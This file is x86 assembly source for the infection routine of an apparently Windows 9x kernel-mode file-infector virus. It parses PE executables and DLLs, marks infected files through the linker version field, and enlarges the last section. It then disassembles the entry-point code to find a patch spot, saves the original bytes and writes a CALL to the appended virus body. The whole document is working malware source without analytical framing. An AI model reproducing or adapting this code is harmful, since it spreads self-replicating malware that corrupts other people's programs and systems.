
 ; input:  EDX=file name
 ; output: EAX=exitcode (1=infected)

 ; infection method (PE-EXE/DLL):
 ; - take eip
 ; - get instruction by instruction until JMP/CALL/RET found
 ; - save 5 original bytes
 ; - insert CALL to virus

infect_file             proc    pascal
                        local   mz:BYTE:size mz_struc
                        local   oe:BYTE:size oe_struc
                        local   pe:BYTE:size pe_struc
                        local   vir_oe_offs
                        local   eip_offs
                        local   eip_rva
                        local   vir_offs
                        local   vir_rva
                        local   patch:BYTE:8
                        pusha

                        pusha
                        sub     esp, 28
                        mov     eax, esp
                        push    28
                        push    eax             ; esi = MEMORY_BASIC_INFO
                        push    edx
                        VxDcall VMM, PageQuery
                        test    dword ptr [esp+4*3+10h], 1000h ; mbi_state & MEM_COMMIT
                        lea     esp, [esp+4*3+28]
                        popa
                        jz      __exit

                        mov     dword ptr [esp+7*4], 0

                        int 3

                        call    r0_fopen_ro
                        jc      __exit
                        xchg    ebx, eax

                        lea     edx, mz
                        mov     ecx, size mz_struc
                        xor     esi, esi
                        call    r0_fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     [edx].mz_id, 'ZM'
                        jne     __close

                        lea     edx, pe
                        mov     ecx, size pe_struc
                        mov     esi, mz.mz_neptr
                        call    r0_fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     pe.pe_id, 'EP'
                        jne     __close

                        cmp     pe.pe_linkminor, 19  ; alredy infected?
                        je      __close
                        mov     pe.pe_linkminor, 19

                        xor     ecx, ecx
                        mov     pe.pe_checksum, ecx
                        mov     eip_offs, ecx

                        mov     eax, pe.pe_entrypointrva
                        mov     eip_rva, eax

                        movzx   esi, pe.pe_ntheadersize
                        add     esi, mz.mz_neptr
                        add     esi, pe_ntheader_id-pe_id

                        movzx   ecx, pe.pe_numofobjects
                        or      ecx, ecx
                        jz      __close
__cycle:

                        lea     edx, oe
                        push    ecx
                        mov     ecx, size oe_struc
                        call    r0_fread
                        cmp     eax, ecx
                        pop     ecx
                        jne     __close

                        mov     eax, eip_rva
                        sub     eax, oe.oe_virt_rva
                        cmp     eax, oe.oe_phys_size
                        jae     __cont
                        add     eax, oe.oe_phys_offs
                        mov     eip_offs, eax
__cont:
                        add     esi, size oe_struc
                        dec     ecx
                        jnz     __cycle

                        cmp     eip_offs, 0
                        je      __close

                        sub     esi, size oe_struc
                        mov     vir_oe_offs, esi


                        mov     eax, oe.oe_virt_size
                        mov     ecx, pe.pe_objectalign
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     oe.oe_virt_size, eax

                        mov     eax, oe.oe_phys_size
                        mov     ecx, pe.pe_objectalign          ; !
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     oe.oe_phys_size, eax

                        mov     eax, oe.oe_virt_size
                        or      eax, eax
                        jz      __close
                        mov     ecx, oe.oe_phys_size
                        or      ecx, ecx
                        jz      __close
                        cmp     ecx, eax
                        ja      __close

                        mov     eax, oe.oe_phys_offs
                        add     eax, oe.oe_phys_size
                        mov     vir_offs, eax
                        mov     eax, oe.oe_virt_rva
                        add     eax, oe.oe_phys_size
                        mov     vir_rva, eax

                        mov     eax, virsize
                        add     oe.oe_phys_size, eax
                        add     oe.oe_virt_size, eax
                        add     pe.pe_sizeofcode, eax
                        add     pe.pe_imagesize, eax

                        getofs  edx, eip_buf
                        mov     ecx, eip_buf_size
                        mov     esi, eip_offs
                        call    r0_fread
                        cmp     eax, ecx
                        jne     __close

                        getofs  edx, tbl                ; edx!
                        push    edx
                        call    disasm_init

                        xor     ecx, ecx

__disasm:               cmp     ecx, eip_buf_size-64
                        jae     __done

                        getofs  esi, eip_buf
                        add     esi, ecx

; some opcodes removed 'coz reloc-dwords may be patched (if DLL)
                        mov     eax, [esi]
                        cmp     al, 0E8h
                        je      __done
                        cmp     al, 0E9h                ; jmp near
                        je      __done
                        cmp     al, 0EBh                ; jmp short
                        je      __done
                        and     ah, 0F0h                ; jxx near
                        cmp     ax, 800Fh
                        je      __done
                        and     al, 0F0h                ; jxx
                        cmp     al, 70h
                        je      __done
                        mov     eax, [esi]
                        and     al, 0FCh                ; jecxz/loop/z/nz
                        cmp     al, 0E0h
                        je      __done
                        mov     eax, [esi]
                        and     al, 0F6h                ; ret[f]/ret[f] #
                        cmp     al, 0C2h
                        je      __done
;                       mov     eax, [esi]
;                       and     ah, 38h
;                       cmp     ax, 10FFh               ; jmp modrm
;                       je      __done
;                       cmp     ax, 20FFh               ; call modrm
;                       je      __done

                        push    esi
                        push    edx
                        call    disasm_main
                        cmp     eax, -1
                        je      __done

                        add     ecx, eax
                        jmp     __disasm
__done:

                        add     eip_offs, ecx
                        add     eip_rva, ecx

                        getofs  edx, vircopy
                        add     edx, orig_bytes-start
                        mov     ecx, 5
                        mov     esi, eip_offs
                        call    r0_fread
                        cmp     eax, ecx
                        jne     __close

                        mov     patch.byte ptr 0, 0E8h
                        mov     eax, vir_rva
                        sub     eax, eip_rva
                        add     eax, entry-start-5
                        mov     patch.dword ptr 1, eax

                        call    r0_make_handle_rw       ; fuck'em!

                        lea     edx, patch
                        mov     ecx, 5
                        mov     esi, eip_rva
                        call    r0_fwrite

                        getofs  edx, vircopy
                        mov     ecx, virsize
                        mov     esi, vir_offs
                        call    r0_fwrite

                        lea     edx, pe
                        mov     ecx, size pe_struc
                        mov     esi, mz.mz_neptr
                        call    r0_fwrite

                        lea     edx, oe
                        mov     ecx, size oe_struc
                        mov     esi, vir_oe_offs
                        call    r0_fwrite

                        call    r0_make_handle_ro

                        inc     dword ptr [esp+7*4]

__close:                call    r0_fclose

__exit:                 popa
                        ret
                        endp
